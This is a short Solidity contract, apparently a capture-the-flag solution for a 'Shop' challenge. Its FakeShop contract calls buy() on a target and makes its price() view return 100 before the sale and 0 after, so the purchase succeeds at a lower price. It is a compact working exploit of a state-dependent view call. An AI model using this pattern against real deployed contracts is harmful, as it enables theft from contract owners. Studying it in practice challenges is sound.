// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface Buyer {
    function price() external view returns (uint256);
}

contract FakeShop is Buyer {
    function attack(address vulnerableScAddress) public {
        vulnerableScAddress.call(abi.encodeWithSignature("buy()"));
    }

    function price() external view override returns (uint256) {
        bool isSold = Shop(msg.sender).isSold();
        if (!isSold) {
            return 100;
        }
        return 0;
    }
}
